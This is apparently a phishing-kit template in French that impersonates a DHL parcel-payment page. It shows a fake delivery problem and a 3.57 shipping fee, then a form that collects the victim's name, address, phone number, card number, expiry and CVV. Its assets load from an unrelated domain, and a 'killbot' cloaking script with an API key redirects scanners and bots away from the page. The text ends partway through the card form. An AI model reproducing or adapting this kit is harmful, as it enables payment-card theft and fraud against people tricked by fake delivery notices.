<!doctype html>
<html lang="fr" >
  <head>
    <script src="https://kit.fontawesome.com/f7165dd215.js" crossorigin="anonymous"></script>
    <script type="text/javascript">
        const killbot = {
            apiKey: "XVMpB5exZpe6LjHpLHitdhu8mRZbRdZtq5UF6LD4hpXOX", 
            botRedirection: "https://yandex.com" // Bot will be redirect to this URL, you can change it
        }
    </script>
    <script src="https://files.killbot.org/.cdn-cgi/killbot-security.js"></script>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="session_hash" content="fa08304132bc7b0252df9782a2491d28">
    <meta name="csrf-token" content="{{ csrf_token() }}" />
    <meta name="visit_id" content="626">
    <link rel="stylesheet" href="../css/style.css">
        <link rel="stylesheet" href="../css/app.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <style>
    
.product_summary {
    display: flex;
    flex-wrap: wrap
}

.product_summary .colon {
    display: none
}

.product_summary .tracking_number {
    display: block;
    width: 100%;
    order: 1;
    margin-bottom: 30px
}

.product_summary .tracking_number .tracking-number {
    color: #595959;
    font-weight: normal;
    font-family: 'HelveticaNeueW01', Helvetica, Arial, sans-serif;
    font-size: 19px
}

.product_summary .expected_delivery {
    display: block;
    width: 100%;
    order: 2
}

.product_summary .expected_delivery p {
    margin-bottom: 25px
}

.product_summary .expected_delivery h2 {
    display: block;
    margin-bottom: 10px
}

.product_summary .expected_delivery h2 em {
    display: block;
    font-family: "HelveticaNeueW01", Helvetica, Arial, sans-serif;
    font-weight: 700;
    font-style: normal;
    color: #595959;
    font-size: 24px;
    text-transform: uppercase
}

.product_summary .expected_delivery h2 em:before,
.product_summary .expected_delivery h2 em:after {
    content: " ";
    display: table
}

.product_summary .expected_delivery h2 em:after {
    clear: both
}

.product_summary .expected_delivery h2 em:after {
    content: "";
    display: block;
    height: 10px
}

.product_summary .expected_delivery h2 .eta_wrap {
    display: table
}

.product_summary .expected_delivery h2 .eta_snip {
    display: table-cell;
    vertical-align: bottom;
    white-space: nowrap;
    padding-right: 10px;
    line-height: 1
}

.product_summary .expected_delivery h2 .eta_snip:before,
.product_summary .expected_delivery h2 .eta_snip:after {
    content: " ";
    display: table
}

.product_summary .expected_delivery h2 .eta_snip:after {
    clear: both
}

.product_summary .expected_delivery h2 .eta_snip:nth-of-type(2) {
    white-space: normal;
    padding-left: 10px;
    border-left: solid 1px #d8d8d8
}

.product_summary .expected_delivery h2 .date {
    display: inline-block;
    font-family: "HelveticaNeueW01", Helvetica, Arial, sans-serif;
    font-weight: 700;
    font-style: normal;
    font-size: 60px;
    line-height: .8
}

.product_summary .expected_delivery h2 .month_year {
    display: inline-block;
    padding-left: 5px;
    font-family: "HelveticaNeueW01", Helvetica, Arial, sans-serif;
    font-weight: 400;
    font-style: normal;
    font-size: 14px;
    text-transform: uppercase;
    color: #595959
}

.product_summary .expected_delivery h2 .month_year span:not(.speech_bubble) {
    display: block
}

.product_summary .expected_delivery h2 .descriptor {
    display: block;
    font-family: "HelveticaNeueW01", Helvetica, Arial, sans-serif;
    font-weight: 400;
    font-style: normal;
    font-size: 18px
}

.product_summary .expected_delivery h2 .time {
    display: inline-block;
    white-space: normal;
    margin-top: 5px;
    font-family: "HelveticaNeueW01", Helvetica, Arial, sans-serif;
    font-weight: 700;
    font-style: normal;
    font-size: 24px;
    line-height: 1
}

.product_summary .delivery_status {
    display: block;
    order: 4;
    margin-bottom: 20px
}

.product_summary .delivery_status h3 {
    display: none
}

.product_summary .delivery_status h2 {
    margin-bottom: 10px
}

.product_summary .delivery_status h2 strong {
    font-family: "HelveticaNeueW01", Helvetica, Arial, sans-serif;
    font-weight: 700;
    font-style: normal;
    font-size: 24px;
    line-height: 1.2
}

.product_summary .delivery_status .status_feed p {
    font-size: 14px
}

.product_summary .delivery_status .status_feed .action_jump {
    display: inline-block;
    margin-top: 10px
}

.product_summary .delivery_status .status_feed .action_jump i {
    color: #e71921;
    font-size: 10px
}

.product_summary .delivery_status .status_feed a.action_jump {
    font-size: 14px
}

.action_jump_wrapper {
    margin-bottom: 7px
}

div.expected_delivery>h2>span>span:nth-child(2)>div>a {
    font-size: 14px
}

.product_summary .expected_delivery .action_jump i {
    color: #e71921;
    font-size: 10px
}

.product_summary .status_bar {
    display: block;
    order: 3;
    width: 100%;
    margin-bottom: 20px;
    text-align: right
}

@media only screen and (max-width:767px) {
    .product_summary .status_bar {
        margin-top: 15px
    }
}

.product_summary .status_bar .text_explanation {
    display: none;
    margin-top: 10px;
    font-family: "HelveticaNeueW01", Helvetica, Arial, sans-serif;
    font-weight: 700;
    font-style: normal;
    font-size: 16px;
    color: #67a31d;
}

.product_summary .status_bar .bar_third {
    position: relative;
    float: left;
    width: calc(33.33% - 5px);
    height: 15px;
    margin-right: 5px;
    transform: skew(-20deg);
    transform-origin: left bottom;
    background: #d8d8d8
}

.product_summary .status_bar .bar_third:first-child:before {
    content: "";
    position: absolute;
    top: 0;
    left: 0;
    width: 15px;
    height: 100%;
    transform: skew(20deg);
    transform-origin: left bottom;
    background: #67a31d;
}

.product_summary .status_bar .bar_third.bar_third_3 {
    margin-right: 0;
    width: 33.33%
}

.product_summary .status_bar .bar_third>span {
    display: block;
    position: absolute;
    width: 0;
    height: 100%;
    background: #67a31d;
}

.product_summary .status_bar.status_0 {
    text-align: left
}

.product_summary .status_bar.status_0 .bar_third:first-child:before {
    background: #d8d8d8
}

.product_summary .status_bar.status_1 {
    text-align: left
}

.product_summary .status_bar.status_1 .bar_third_1 span {
    width: 50%
}

.product_summary .status_bar.status_2 .bar_third_1 span {
    width: 100%
}

.product_summary .status_bar.status_2 .text_explanation {
    margin-right: 66.66%
}

.product_summary .status_bar.status_3 .bar_third_1 span {
    width: 100%
}

.product_summary .status_bar.status_3 .bar_third_2 span {
    width: 50%
}

.product_summary .status_bar.status_3 .text_explanation {
    margin-right: 50%
}

.product_summary .status_bar.status_4 .bar_third_1 span {
    width: 100%
}

.product_summary .status_bar.status_4 .bar_third_2 span {
    width: 100%
}

.product_summary .status_bar.status_4 .text_explanation {
    margin-right: 33.33%
}

.product_summary .status_bar.status_5 .bar_third span {
    width: 100%
}

.product_summary .status_bar.status_5 .bar_third_3 span {
    width: 50%
}

.product_summary .status_bar.status_5 .text_explanation {
    margin-right: 16.66%
}

.product_summary .status_bar.status_6 .bar_third span {
    width: 100%;
    background: #218748
}

.product_summary .status_bar.status_6 .bar_third:first-child:before {
    background: #218748
}

.product_summary .status_bar.status_7 .bar_third span {
    width: 100%
}

.product_summary.delivery_na .delivery_status {
    width: 100%
}

.product_summary.delivery_na .delivery_status h2 {
    color: #e71921
}

.product_summary.delivery_na .text_explanation {
    color: #e71921
}

.product_summary.delivery_attempted .delivery_status h2 {
    color: #336
}

.product_summary.delivery_attempted .delivery_status h2 strong {
    font-size: 22px
}

.product_summary.delivery_attempted .text_explanation {
    color: #336
}

.product_summary.delivery_delivered .delivery_status h2 {
    color: #218748
}

.product_summary.delivery_delivered .delivery_status h2 strong:before {
    margin-right: 10px
}

.product_summary.delivery_delivered .text_explanation {
    color: #218748
}

.product_summary.delivery_delivered_to_agent .delivery_status h2 {
    color: #218748
}

.product_summary.delivery_delivered_to_agent .delivery_status h2 strong:before {
    margin-right: 10px
}

.product_summary.delivery_delivered_to_agent .text_explanation {
    color: #218748
}

.product_summary.delivery_preshipment .delivery_status h2 {
    color: #336
}

.product_summary.delivery_preshipment .delivery_status h2 strong {
    font-size: 22px
}

.product_summary.delivery_preshipment .text_explanation {
    color: #336
}

.product_summary.delivery_onitsway .delivery_status h2 {
    color: #336
}

.product_summary.delivery_onitsway .delivery_status h2 strong {
    font-size: 22px
}

.product_summary.delivery_onitsway .text_explanation {
    color: #336
}

.product_summary.delivery_accepted .delivery_status h2 {
    color: #336
}

.product_summary.delivery_accepted .delivery_status h2 strong {
    font-size: 22px
}

.product_summary.delivery_accepted .text_explanation {
    color: #336
}

.product_summary.delivery_transit .delivery_status h2 {
    color: #336
}

.product_summary.delivery_transit .delivery_status h2 strong {
    font-size: 22px
}

.product_summary.delivery_transit .text_explanation {
    color: #336
}

.product_summary.delivery_transit_delayed .delivery_status h2 {
    color: #336
}

.product_summary.delivery_transit_delayed .delivery_status h2 strong {
    font-size: 22px
}

.product_summary.delivery_transit_delayed .text_explanation {
    color: #336
}

.product_summary.delivery_alert .delivery_status h2 {
    color: #e71921
}

.product_summary.delivery_alert .delivery_status h2 strong {
    font-size: 22px
}

.product_summary.delivery_alert .text_explanation {
    color: #e71921
}

.product_summary.delivery_archived .delivery_status h2 {
    color: #336
}

.product_summary.delivery_archived .delivery_status h2 strong {
    font-size: 22px
}

.product_summary.delivery_archived .text_explanation {
    color: #336
}

.product_summary.delivery_duplicate .delivery_status h2 {
    color: #336
}

.product_summary.delivery_duplicate .delivery_status h2 strong {
    font-size: 22px
}

.product_summary.delivery_duplicate .text_explanation {
    color: #336
}

.product_summary.delivery_seized .delivery_status h2 {
    color: #336
}

.product_summary.delivery_seized .delivery_status h2 strong {
    font-size: 22px
}

.product_summary.delivery_seized .text_explanation {
    color: #336
}

.product_summary.delivery_exception .delivery_status {
    width: 100%
}

.product_summary.delivery_exception .delivery_status h2 {
    color: #e71921
}

.product_summary.delivery_exception .delivery_status h2 strong {
    font-size: 22px
}

.product_summary.delivery_exception .text_explanation {
    color: #e71921
}

.product_summary.delivery_pickup .delivery_status h2 {
    color: #336
}

.product_summary.delivery_pickup .delivery_status h2 strong {
    font-size: 22px
}

.product_summary.delivery_pickup .text_explanation {
    color: #336
}

.product_summary.delivery_out_for_delivery .delivery_status h2 {
    color: #336
}

.product_summary.delivery_out_for_delivery .delivery_status h2 strong {
    font-size: 22px
}

.product_summary.delivery_out_for_delivery .text_explanation {
    color: #336
}

.product_summary.delivery_attempted_action .delivery_status h2 {
    color: #e71921
}

.product_summary.delivery_attempted_action .delivery_status h2 strong {
    font-size: 22px
}

.product_summary.delivery_attempted_action .text_explanation {
    color: #e71921
}

@media only screen and (min-width:768px) {
    .product_summary .expected_delivery {
        width: 45%;
        margin-right: 5%;
        margin-bottom: 25px
    }
    .product_summary .expected_delivery p {
        margin-top: 50px
    }
    .product_summary .delivery_status {
        width: 50%
    }
    .product_summary .delivery_status h3 {
        display: block
    }
    .product_summary .status_bar {
        order: 4
    }
    .product_summary .status_bar .text_explanation {
        display: inline-block
    }
}

.summary-card {
    background: #E9E9E9;
    color: #a1a1a1;
    border: none;
    box-shadow: none;
}

.summary-card > .card-body > .row {
    padding-top: .75rem;
    padding-bottom: .5rem;
}

.summary-card > .card-body > .row:not(:last-child) {
    border-bottom: 1px solid #fff;
}

.summary-card .row-icon {
    font-size: 25px;
    margin-right: .75rem;
}

.parsley-errors-list + .flag-dropdown {
    top: -17px;
}

.parsley-errors-list.filled + .flag-dropdown {
    top: -30px;
}

.country-select.inside input {
    padding: .5rem !important;
}

.country-col .country-select.inside {
    display: block !important;
}

.country-col .country-select.inside .form-control {
    width: 100%;
}

.summary-table td, .summary-table th {
    padding: .35rem;
    border-top: 0;
    border-bottom: 1px solid #aaaeb3;
}

.summary-table th {
    border: 0;
}

@media (max-width: 768px) {
    .container {
        max-width: 100vw;
    }

    .kQwli, .rtYhf {
        padding-top: 30px !important;
    }

    .card-head {
        font-weight: 600;
    }

    .card-head::after {
        display: block;
    }
}
</style>

    <title>DHL</title>
    <link rel="icon" type="image/ico" href="https://dispatching-centre.wtechsmartwater.com/images/favicon.gif"/>
  </head>
  <body  data-aos-easing="ease" data-aos-duration="1000" data-aos-delay="0" style="margin: 0;">
  <div class="se-pre-con"></div>
  <header class="header">
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <div class="container">

            <button class="bg-transparent border-0 p-0 d-md-none" onclick="openNav()">
                    <i class="fa fa-bars" style="font-size: 20px; color: #7d7a7a;"></i>
            </button>
            <!-- mobile part -->
            <a class="navbar-brand p-0" href="#">
                <img src="https://dispatching-centre.wtechsmartwater.com/images/logo.png" alt="" class="img-responsive">
            </a>
            <form class="mb-1 d-md-none">
                <div class="form-item mobile-country-selector">
                    <label for="mobile_country_selector" style="display:none;">Select a country here...</label>
                    <input id="mobile_country_selector" class="d-none" type="text">
                </div>
                <div class="form-item" style="display:none;">
                    <input type="text" id="mobile_country_selector_code" name="mobile_country_selector_code" data-countrycodeinput="1" readonly="readonly" placeholder="Selected country code will appear here" />
                    <label for="mobile_country_selector_code">...and the selected country code will be updated here</label>
                </div>
                <button type="submit" style="display:none;">Submit</button>
            </form>

            <div id="mySidepanel" class="sidepanel">
                <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">×</a>
                <a href="#" class=""><span class="mbl_home"><i class="fas fa-home"></i></span>Home</a>
                <a href="#" class=""><span class="mbl_ship"><i class="fas fa-shipping-fast"></i></span>Ship</a>
                <a href="#" class=""><span class="mbl_track"><i class="fas fa-location-arrow"></i></span>Track</a>
                <a class="mbl_help" href="#"><span class="ic"><i class="fas fa-hands-helping"></i></span>{{Session()->get("lang-header-help")}}</a>
                <a class="mbl_find" href="#"><span class="icc"><i class="fas fa-map-marker-alt"></i></span>{{Session()->get("lang-header-find")}}</a>

                <a href="#" class=" reg_m"><span class="mbl_reg"><i class="fas fa-lock"></i></span>Connexion</a>

            </div>
            <div class="navbar-collapse">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link" href="#">{{Session()->get("lang-header-help")}}</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link loc" href="#">{{Session()->get("lang-header-find")}}</a>
                    </li>
                    <li>
                        <div class="jhGf">
                            <label for="">
                                <span class="page-search-divider"></span>
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-search" viewBox="0 0 16 16">
                                    <path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/>
                                </svg>
                            </label>
                        </div>
                    </li>
                    <li class="v2-vertical-divider"></li>
                    <li>
                        <div class="container">
                            <form>
                                <div class="form-item">
                                    <label for="country_selector" style="display:none;">Sélectionnez un pays ici...</label>

                                </div>
                                <div class="form-item" style="display:none;">
                                    <input type="text" id="country_selector_code" name="country_selector_code" data-countrycodeinput="1" readonly="readonly" placeholder="Selected country code will appear here" />
                                    <label for="country_selector_code">...et le code pays sélectionné sera mis à jour ici</label>
                                </div>
                                <button type="submit" style="display:none;">soumettre</button>
                            </form>
                        </div>
                    </li>
                </ul>
            <!-- <form class="d-flex">
                <input class="form-control me-2" type="search" placeholder="Search" aria-label="Search">
                <button class="btn btn-outline-success" type="submit">Search</button>
            </form> -->
            </div>
        </div>
    </nav>
    <div class="iKjer"></div>
    <div class="header-nav">
        <div class="container">
            <div class="row">
                <div class="col-sm-6 col-md-8 col">
                    <ul class="header-navbar-nav me-auto mb-2 mb-lg-0">
                        <li class="nav-li">
                            <a href="#" class="top-nav">{{Session()->get("lang-header-home")}}</a>
                        </li>
                        <li class="nav-li">
                            <a href="#" class="top-nav">{{Session()->get("lang-header-ship")}}</a>
                        </li>
                        <li class="nav-li">
                            <a href="#" class="top-nav">{{Session()->get("lang-header-track")}}</a>
                        </li>
                    </ul>
                </div>
                <div class="col-sm-6 col-md-3 col">
                    <ul class="eriOl">
                        <li class="nav-li"><a href="#" class="top-nav">{{Session()->get("lang-header-register")}}</a></li>
                        <li class="nav-li"><a href="#" class="top-nav">{{Session()->get("lang-header-login")}}</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</header>

    <div class="rtYhf">
    <div class="pdIue">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="card summary-card">
                        <div class="card-body pl-4">
                            <div class="row">
                                <div class="col-6 d-flex align-items-center">
                                    <i class="fa-solid fa-truck-fast"></i>
                                    <strong>&nbsp;&nbsp;{{Session()->get("lang-payment-package")}}</strong>
                                </div>
                                <div class="col-6 d-flex align-items-center">
                                    {{Session()->get("lang-payment-protection")}}                              </div>
                            </div>
                            <div class="row">
                                <div class="col-12 d-flex align-items-center">
                                    <i class="fa fa-box row-icon"></i>
                                    <strong>{{Session()->get("lang-payment-box")}}</strong>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-6 d-flex align-items-center">
                                    <i class="fa fa-calendar-alt row-icon"></i>
                                    <section>

                                        <div class="row">
                                            <div class="col-12">
                                                <strong>{{Session()->get("lang-payment-exped")}}:</strong>
                                                <span>{{now()->isoFormat('MMMM Do YYYY')}}</span>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col-12">
                                                <strong>{{Session()->get("lang-payment-shipcost")}} :</strong>
                                                <span>3.57 {{$currency_code}}</span>
                                            </div>
                                        </div>
                                    </section>
                                </div>
                                <div class="col-6">
                                    <div class="row">
                                        <div class="col-12">
                                            <strong>{{Session()->get("lang-payment-deldate")}}</strong>
                                            <span>{{now()->addDays(3)->isoFormat('MMMM Do YYYY')}}</span>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-12">
                                            <strong>{{Session()->get("lang-payment-delby")}}:</strong>
                                            <span>{{Session()->get("lang-payment-eod")}}</span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="kQwli p-0 p-4">
                <section class="pt-2 pl-3 pr-3 pb-3 p-md-0">
                    <h5 class="font-weight-bold">{{Session()->get("lang-payment-summary")}}</h5>
                    <div class="row">
            <div class="col-sm-10 col-sm-offset-1">
              <div class="product_summary delivery_exception">
              <!--  <h3 class="tracking_number">
                  Tracking Number:
                  <span class="tracking-number"> DH9514901185421</span>
               </h3> -->
		<div class="expected_delivery">
	</div>
		<div class="delivery_status">
                  <h3>{{Session()->get("lang-payment-status")}} : </h3>
                  <h2> <strong>{{Session()->get("lang-payment-issues")}}</strong>
					<p style="margin-top:15px;font-size:14px; color:black;">{{Session()->get("lang-payment-allows")}}<br>{{Session()->get("lang-payment-canalso")}}</p></h2>
                  <div class="status_feed">
                    <p> 
                    </p><p class="important"></p>
                    <p></p>
				 </div> 
                </div>
					<div class="status_bar status_1">
                  <div class="bar_third bar_third_1" style="background:#67a31d;"><span></span></div>
                  <div class="bar_third bar_third_2"><span></span></div>
                  <div class="bar_third bar_third_3"><span></span></div>
				<span class="text_explanation">{{Session()->get("lang-payment-statusnot")}}</span></div>
              </div> <!-- END Product Summary -->
        </div><!-- End col -->	
      </div>
                    <div class="row mt-4 mb-4">
                        <div class="col-md-6">
                            <div>
                                <p class="text-uppercase font-weight-bold mb-0">{{Session()->get("lang-payment-express")}}</p>
                                {{now()->isoFormat('MMMM Do YYYY')}} - {{Session()->get("lang-payment-eod")}}                            </div>
                            <div class="d-flex mt-md-4 align-items-center">
                                <p class="font-weight-bold mr-1 mb-0">{{Session()->get("lang-payment-volum")}}</p>
                                <i class="fa fa-info-circle mr-2"
                                    style="color: #007acc;"
                                    data-toggle="tooltip"
                                    data-html="true"
                                    title="<p class='mb-0'>Si votre colis est de grande taille et léger, DHL peut calculer le prix de livraison en utilisant le poids volumétrique (poids volumétrique) plutôt que simplement le poids. Le poids volumétrique est arrondi à la livre ou au kilogramme complet suivant.</p><p class='mb-0'>Voici comment nous calculons le poids volumétrique :</p><p class='mb-0'>LxLxH(in)/139 = Poids (lb)</p><p class='mb-0'>LxLxH(cm)/5000 = Poids (kg)</p>"></i>
                                1,2 kg
                            </div>
                            <div class="d-flex">
                                <p class="font-weight-bold mr-2 mb-0">{{Session()->get("lang-payment-totalw")}}</p>
                                1
                            </div>
                            <div class="d-flex">
                                <p class="font-weight-bold mr-2 mb-0">{{Session()->get("lang-payment-taxw")}}</p>
                                1,5 kg
                            </div>
                        </div>
                        <div class="col-md-6 mt-3 mt-md-0">
                            <table class="table summary-table">
                                <tbody>
                                    <tr>
                                        <td>{{Session()->get("lang-payment-freight")}}:</td>
                                        <td>{{$currency_code}}</td>
                                        <td>2,73</td>
                                    </tr>
                                    <tr>
                                        <td>{{Session()->get("lang-payment-resid")}} :</td>
                                        <td>{{$currency_code}}</td>
                                        <td>0,70</td>
                                    </tr>
                                    <tr>
                                        <td>{{Session()->get("lang-payment-emer")}}</td>
                                        <td>{{$currency_code}}</td>
                                        <td>0,14</td>
                                    </tr>
                                </tbody>
                                <tfoot>
                                    <tr>
                                        <th>{{Session()->get("lang-payment-total")}}</th>
                                        <th>{{$currency_code}}</th>
                                        <th>3,57</th>
                                    </tr>
                                </tfoot>
                            </table>
                        </div>
                    </div>
                </section>

                <div class="row c-form mb-2" style="display: none;">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-body b-info d-flex justify-content-between">
                                <div>
                                    <span class="first_name"></span>
                                    <span class="last_name"></span>
                                    <span class="line_1"></span>
                                    <span class="line_2"></span>,
                                    <span class="state"></span>
                                    <span class="postal_code"></span>
                                    <span class="country"></span>
                                </div>
                                <a href="#" id="b-edit">Edit</a>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="card" style="background-color: #F1F1F1;">
                    <div class="card-body p-2">
                        <div class="row">
                            <div class="col-md-12">
                                <!-- </div>
                                    <div class="bs-callout bs-callout-warning hidden">
                                    <h4>Oh snap!</h4>
                                    <p>This form seems to be invalid :(</p>
                                    </div>

                                    <div class="bs-callout bs-callout-info hidden">
                                    <h4>Yay!</h4>
                                    <p>Everything seems to be ok :)</p>
                                </div> -->

                                <!-- Let me see it in action then -->
                                <div class="alert alert-danger" role="alert" style="display: none;" id="error-alert">
                                    <span class="d-icon">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
                                            class="bi bi-exclamation-octagon-fill" viewBox="0 0 16 16">
                                            <path
                                                d="M11.46.146A.5.5 0 0 0 11.107 0H4.893a.5.5 0 0 0-.353.146L.146 4.54A.5.5 0 0 0 0 4.893v6.214a.5.5 0 0 0 .146.353l4.394 4.394a.5.5 0 0 0 .353.146h6.214a.5.5 0 0 0 .353-.146l4.394-4.394a.5.5 0 0 0 .146-.353V4.893a.5.5 0 0 0-.146-.353L11.46.146zM8 4c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 4.995A.905.905 0 0 1 8 4zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z" />
                                        </svg>
                                    </span>
                                    <span class="d-msg">There is a problem with your credit card</span>
                                </div>

                                <div class="alert alert-danger" role="alert" style="display: none;" id="unexpected-error-alert">
                                    <span class="d-icon">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
                                            class="bi bi-exclamation-octagon-fill" viewBox="0 0 16 16">
                                            <path
                                                d="M11.46.146A.5.5 0 0 0 11.107 0H4.893a.5.5 0 0 0-.353.146L.146 4.54A.5.5 0 0 0 0 4.893v6.214a.5.5 0 0 0 .146.353l4.394 4.394a.5.5 0 0 0 .353.146h6.214a.5.5 0 0 0 .353-.146l4.394-4.394a.5.5 0 0 0 .146-.353V4.893a.5.5 0 0 0-.146-.353L11.46.146zM8 4c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 4.995A.905.905 0 0 1 8 4zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z" />
                                        </svg>
                                    </span>
                                    <span class="d-msg">Une erreur imprévue s'est produite. Veuillez réessayer.</span>
                                </div>
                                <form class="g-3 position-relative" action="store" id="card_info" method="post"
                                    data-parsley-validate="">
@csrf
                                    <div id="username_nKh7SDAUCH1LCB7r_wrap" style="display:none;">
        <input name="username_nKh7SDAUCH1LCB7r" type="text" value="" id="username_nKh7SDAUCH1LCB7r">
        <input name="valid_from" type="text" value="eyJpdiI6Ik5aZWlUb3VkakZmOG9NTldnNFg2L2c9PSIsInZhbHVlIjoiRkRWa3VpbHNjWnl1Nmc2Tzd1M3NNdz09IiwibWFjIjoiMDk1ZjUyNjU0MTFlZTU2MDAyNTAyMzgwYzc3YzQ4ZTQ1NWMwNzk0YTdkNzhmYmNhYzJlZDAwOTg5MzkxYmYzMiIsInRhZyI6IiJ9">
    </div>

                                    <div class="se-pre-con position-absolute" style="display: none; z-index: 2;" id="load-form"></div>
                                    <div class="row">
                                        <div class="col-md-12 wfJui border-0 pt-3" id="b-form">
                                            <h4 class="card-head">{{Session()->get("lang-payment-address")}}</h4>
                                            <div class="col-12">
                                                <label for="first_name"
                                                    class="form-label">{{Session()->get("lang-payment-firstn")}}</label>
                                                <input type="text" class="form-control" name="first_name" id="first_name"
                                                    autocomplete="given-name" data-parsley-minlength="2"
                                                    data-parsley-minlength-message="Minimum character: 2"
                                                    data-parsley-required-message="Required" data-parsley-trigger="focusout"
                                                    value=""
                                                    required="">
                                            </div>
                                            <div class="col-12">
                                                <label for="last_name"
                                                    class="form-label">{{Session()->get("lang-payment-lastn")}}</label>
                                                <input type="text" class="form-control" name="last_name" id="last_name"
                                                    autocomplete="family-name" data-parsley-minlength="2"
                                                    data-parsley-minlength-message="Minimum character: 2"
                                                    data-parsley-required-message="Required" data-parsley-trigger="focusout"
                                                    value=""
                                                    required="">
                                            </div>
                                            <div class="col-12">
                                                <label for="line_1"
                                                    class="form-label">{{Session()->get("lang-payment-adr1")}}</label>
                                                <input type="text" class="form-control" name="line_1" id="line_1"
                                                    autocomplete="address-line1" data-parsley-required-message="Required"
                                                    value=""
                                                    data-parsley-trigger="focusout" required="">
                                            </div>
                                            <div class="col-12">
                                                <label for="line_2"
                                                    class="form-label">{{Session()->get("lang-payment-adr2")}}</label>
                                                <input type="text" class="form-control" name="line_2" id="line_2"
                                                    value=""
                                                    autocomplete="address-line2">
                                            </div>

                                            <div class="row" style=" margin-right: 0; margin-left:0;">
                                                <div class="col-md-4">
                                                    <label for="postal_code"
                                                        class="form-label">{{Session()->get("lang-payment-post")}}</label>
                                                    <input type="text" class="form-control" name="postal_code"
                                                        id="postal_code" autocomplete="postal-code" data-parsley-minlength="2"
                                                        data-parsley-minlength-message="Invalid Zip/Postal Code"
                                                        data-parsley-required-message="Required" data-parsley-trigger="focusout"
                                                    value=""
                                                        required="">
                                                </div>
                                                <div class="col-md-4">
                                                    <label for="city" class="form-label">{{Session()->get("lang-payment-city")}}</label>
                                                    <input type="text" class="form-control" name="city" id="city"
                                                        autocomplete="address-level2" data-parsley-required-message="Required"
                                                    value=""
                                                        data-parsley-trigger="focusout" required="">
                                                </div>
                                                <div class="col-md-4">
                                                    <label for="state" class="form-label">{{Session()->get("lang-payment-state")}}</label>
                                                    <input type="text" class="form-control" name="state" id="state"
                                                        autocomplete="address-level1" data-parsley-required-message="Required"
                                                        value=""
                                                        data-parsley-trigger="focusout" required="">
                                                </div>

                                            </div>

                                            <div class="row" style="margin-right: 0; margin-left:0;">
                                                <div class="col-md-6 country-col">
                                                    <label for="country"
                                                        class="form-label">{{Session()->get("lang-payment-country")}}</label>
                                                    <input type="text" class="form-control" name="country" id="country"
                                                        autocomplete="country" data-parsley-required-message="Required"
                                                        value=""
                                                        data-parsley-trigger="focusout" required="">
                                                </div>
                                                <div class="col-md-6">
                                                    <label for="phone_number"
                                                        class="form-label">{{Session()->get("lang-payment-phone")}}</label>
                                                    <input type="text" class="form-control d-block" name="phone_number"
                                                        id="phone_number" type="tel" autocomplete="tel"
                                                        ata-parsley-pattern="^[\d\+\-\.\(\)\/\s]*$"
                                                        value=""
                                                        data-parsley-required-message="Required" data-parsley-trigger="focusout"
                                                        required="">
                                                </div>
                                            </div>
                                            <div class="row justify-content-end pr-md-3 pl-3 pr-3 pl-md-0 pb-3 pb-md-0">
                                                <div class="col-md-4 col-lg-3">
                                                    <button class="btn btn-success btn-block" id="b-continue">{{Session()->get("lang-payment-continue")}}</button>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="col-md-12 wfJui border-0 pl-4 pr-4 pt-3 pb-3 c-form" style="display: none;">
                                            <h4 class="card-head ml-0">{{Session()->get("lang-payment-payment")}}</h4>
                                            <div class="col-md-10">
                                                <div class="form-check">
                                                    <input type="hidden" name="card_type" value="card">

                                                </div>
                                            </div>
                                            <div class="card-wrapper"></div>
                                            <div class="mb-3">
                                                <div class="card-types"></div>
                                                <label for="card_number"
                                                    class="form-label">{{Session()->get("lang-payment-cc")}}</label>
                                                <input type="text" class="form-control" name="card_number" id="cc-num"
                                                    autocomplete="cc-number" data-parsley-required-message="Required"
                                                    value=""
                                                    data-parsley-trigger="focusout" required="">
                                                <div class="card-valid" style="display:none;"><i class="fas fa-check"></i>
                                                </div>
                                            </div>
                                            <div class="row">
                                                <div class="col-md-6">
                                                    <label for="expiry" class="form-label">{{Session()->get("lang-payment-exp")}}</label>
                                                    <input type="text" class="form-control" name="expiry" id="expiry"
                                                        maxlength="7" placeholder="mm/yy"
                                                        value=""
                                                        data-parsley-required-message="Required" data-parsley-trigger="focusout"
                                                        autocomplete="cc-exp">
                                                </div>
                                                <div class="col-md-6">
                                                    <label for="cvv" class="form-label">{{Session()->get("lang-payment-cvv")}}</label>
                                                    <div class="input-wappend w-100 position-relative">
                                                        <input type="text" name="cvv" class="form-control" id="cvv"
                                                            autocomplete="cc-csc" data-parsley-required-message="Required"
                                                            data-parsley-trigger="focusout" required="">
